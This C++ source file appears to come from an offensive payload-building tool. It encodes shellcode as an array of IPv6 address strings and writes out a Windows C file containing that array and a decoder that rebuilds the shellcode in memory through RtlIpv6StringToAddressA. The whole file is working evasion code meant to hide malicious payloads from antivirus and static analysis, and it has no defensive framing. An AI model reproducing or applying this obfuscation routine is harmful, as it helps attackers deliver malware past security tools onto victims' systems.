// Header files //
#include "hdrs/ipv6_obfuscation.h"
#define IPV6_ITER 16


void ipv6Gen(uint32_t ip_1, uint32_t ip_2, uint32_t ip_3, uint32_t ip_4, char* output_buffer,
             size_t buffer_size) {
    /* Purpose - Converts the passed in hex representation to a char IPv6 address.
     * Parameters:
     *      @ ip_1 - First hex ip value.
     *      @ ip_2 - Second hex ip value.
     *      @ ip_3 - Third hex ip value.
     *      @ ip_4 - Fourth hex ip value.
     *      @ output_buffer - A pointer to the char buffer where the formatted result will reside.
     *      @ buffer_size - The size of the output buffer where the formatted output will be stored.
     */
    char ip_parse_1[32], ip_parse_2[32], ip_parse_3[32], ip_parse_4[32];

    // Format the 4 sets of 2 octets //
    std::snprintf(ip_parse_1, sizeof(ip_parse_1), "%02X%02X:%02X%02X",
                  (ip_1 >> 24) & 0xFF,
                  (ip_1 >> 16) & 0xFF,
                  (ip_1 >> 8) & 0xFF,
                  ip_1 & 0xFF);

    std::snprintf(ip_parse_2, sizeof(ip_parse_2), "%02X%02X:%02X%02X",
                  (ip_2 >> 24) & 0xFF,
                  (ip_2 >> 16) & 0xFF,
                  (ip_2 >> 8) & 0xFF,
                  ip_2 & 0xFF);

    std::snprintf(ip_parse_3, sizeof(ip_parse_3), "%02X%02X:%02X%02X",
                  (ip_3 >> 24) & 0xFF,
                  (ip_3 >> 16) & 0xFF,
                  (ip_3 >> 8) & 0xFF,
                  ip_3 & 0xFF);

    std::snprintf(ip_parse_4, sizeof(ip_parse_4), "%02X%02X:%02X%02X",
                  (ip_4 >> 24) & 0xFF,
                  (ip_4 >> 16) & 0xFF,
                  (ip_4 >> 8) & 0xFF,
                  ip_4 & 0xFF);

    // Format the 4 octet sets as resulting IPv6 address //
    std::snprintf(output_buffer, buffer_size, "%s:%s:%s:%s",
                  ip_parse_1, ip_parse_2, ip_parse_3, ip_parse_4);
}


uint32_t ipv6HexGen(int byte_1, int byte_2, int byte_3, int byte_4) {
    /* Purpose - Takes the 4 bytes of passed in shellcode data and generates a hex value to be
     *           converted to an IPv6 address in another function.
     * Parameters:
     *      @ byte_1 - First byte of shellcode.
     *      @ byte_2 - Second byte of shellcode.
     *      @ byte_3 - Third byte of shellcode.
     *      @ byte_4 - Fourth byte of shellcode.
     *
     * Returns - The formatted hex value of the passed in 4 bytes.
     */
    return ((uint32_t)byte_1 << 24) | ((uint32_t)byte_2 << 16) | (byte_3 << 8) | byte_4;
}



void ipv6ObfuscationHandler(ShellcodeStruct& shell_struct) {
    /* Purpose - Takes the shellcode stored in passed in struct and runs it through obfuscation
     *           routine to obfuscate it as an array of IPv6 address. Source code file is generated
     *           with obfuscated array and corresponding decoder routine.
     * Parameters:
     *      @ shell_struct - The shellcode struct where the shellcode to be obfuscated resides.
     */
    const char file_header[] = "#include <Windows.h>\n"
                               "#include <stdio.h>\n"
                               "#include <Ip2string.h>\n"
                               "#pragma comment(lib, \"Ntdll.lib\")\n\n"
                               "#ifndef NT_SUCCESS\n"
                               "#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)\n"
                               "#endif\n";
    // Write the header of the file //
    writeOutputData(shell_struct, file_header);

    const char payload_bracket_inner[] = "\nconst char* IPv6Shell[] = {\n\t";
    // Write the inner bracket of the obfuscated payload //
    writeOutputData(shell_struct, payload_bracket_inner);

    unsigned int num_elements = 0;
    char ipv6_addr[128];
    char format_comma[128];

    // Iterate over the shellcode by increments of 16 //
    for (unsigned int iter = 0; iter <= shell_struct.result_size; iter += IPV6_ITER) {
        // For each 16 bytes, generate 4 ip values of 4 bytes each. Resulting values are passed into
        // a function that generates 4 sets of two octets and puts the IPv6 address together //
        ipv6Gen(ipv6HexGen(shell_struct.pad_shellcode_ptr[iter],
                           shell_struct.pad_shellcode_ptr[iter + 1],
                           shell_struct.pad_shellcode_ptr[iter + 2],
                           shell_struct.pad_shellcode_ptr[iter + 3]),
                ipv6HexGen(shell_struct.pad_shellcode_ptr[iter + 4],
                           shell_struct.pad_shellcode_ptr[iter + 5],
                           shell_struct.pad_shellcode_ptr[iter + 6],
                           shell_struct.pad_shellcode_ptr[iter + 7]),
                ipv6HexGen(shell_struct.pad_shellcode_ptr[iter + 8],
                           shell_struct.pad_shellcode_ptr[iter + 9],
                           shell_struct.pad_shellcode_ptr[iter + 10],
                           shell_struct.pad_shellcode_ptr[iter + 11]),
                ipv6HexGen(shell_struct.pad_shellcode_ptr[iter + 12],
                           shell_struct.pad_shellcode_ptr[iter + 13],
                           shell_struct.pad_shellcode_ptr[iter + 14],
                           shell_struct.pad_shellcode_ptr[iter + 15]),
                ipv6_addr, sizeof (ipv6_addr));

        // Format the resulting IPv6 address with comma to be inserted into array //
        std::snprintf(format_comma, sizeof(format_comma), "\"%s\",", ipv6_addr);
        // Write the formatted comma-separated IP address member //
        writeOutputData(shell_struct, format_comma);

        // Check if a newline is needed (every 6 entries) except for the last entry //
        if (((iter + IPV6_ITER) % 96 == 0) && (iter + IPV6_ITER < shell_struct.result_size)) {
            writeOutputData(shell_struct, "\n\t");
        }
        num_elements++;
    }
    // Move the file stream pointer back one index to overwrite the last comma //
    shell_struct.output_stream.seekp(-1, std::ios_base::end);

    const char payload_bracket_outer[] = "\n};\n\n";
    // Write the outer bracket of the obfuscated payload //
    writeOutputData(shell_struct, payload_bracket_outer);

    const char shellcode_preparse[] = "#define ElementsNumber %d\n"
                                      "#define SizeOfShellcode %d\n\n";
    char shellcode_constants[sizeof(shellcode_preparse) + 10];
    // Parse the formatted string in result buffer //
    std::snprintf(shellcode_constants, sizeof(shellcode_constants), shellcode_preparse,
                  num_elements, shell_struct.result_size);
    // Write the formatted constants //
    writeOutputData(shell_struct, shellcode_constants);

    const char decoder[] = "BOOL DecodeIPv6Fuscation(const char* IPV6[], PVOID LpBaseAddress) {\n"
                           "    PCSTR Terminator = NULL;\n"
                           "    PVOID LpBaseAddress2 = NULL;\n"
                           "    NTSTATUS STATUS;\n\n"
                           "    int i = 0;\n"
                           "    for (int j = 0; j < ElementsNumber; j++) {\n"
                           "        LpBaseAddress2 = PVOID((ULONG_PTR)LpBaseAddress + i);\n"
                           "        STATUS = RtlIpv6StringToAddressA((PCSTR)IPV6[j], &Terminator, (in6_addr*)LpBaseAddress2);\n"
                           "        if (!NT_SUCCESS(STATUS)) {\n"
                           "            printf(\"[!] RtlIpv6StringToAddressA failed for %s result %x\", IPV6[j], STATUS);\n"
                           "            return FALSE;\n"
                           "        }\n"
                           "        else {\n"
                           "            i = i + 16;\n"
                           "        }\n"
                           "    }\n"
                           "    return TRUE;\n"
                           "}\n";
    // Write the decoder function //
    writeOutputData(shell_struct, decoder);
}